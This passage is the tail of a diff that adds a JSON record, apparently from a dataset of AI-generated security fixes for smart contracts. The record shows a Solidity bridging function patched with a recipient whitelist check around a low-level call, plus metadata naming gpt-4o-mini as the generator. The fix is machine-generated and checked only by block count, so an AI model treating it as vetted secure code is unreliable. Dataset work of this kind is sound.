preUSDCBalance = usdc.balanceOf(address(this));\n        // Use call with caution and validate the target address\n        require(isWhitelisted(_bridgeDetails.to), \"Invalid recipient address\");\n        (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);\n\n        if (!success) revert BridgeFundsFailed();\n        uint256 postUSDCBalance = usdc.balanceOf(address(this));\n\n        if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();\n\n        emit FundsBridged(_bridgeDetails.to, _claimedAmount);\n    }",
+      "expected_fixed_blocks": 2,
+      "returned_fixed_blocks": 2,
+      "block_count_match": true,
+      "generated_by": "openai",
+      "generation_date": "2026-04-16T18:00:57.250693"
+    },
+    "fix_code_source": "generated",
+    "validated_at": "2026-04-16T18:00:57.250716",
+    "model": "gpt-4o-mini",
+    "code_input_source": "github_line_refs_function_scope"
+  }
+}
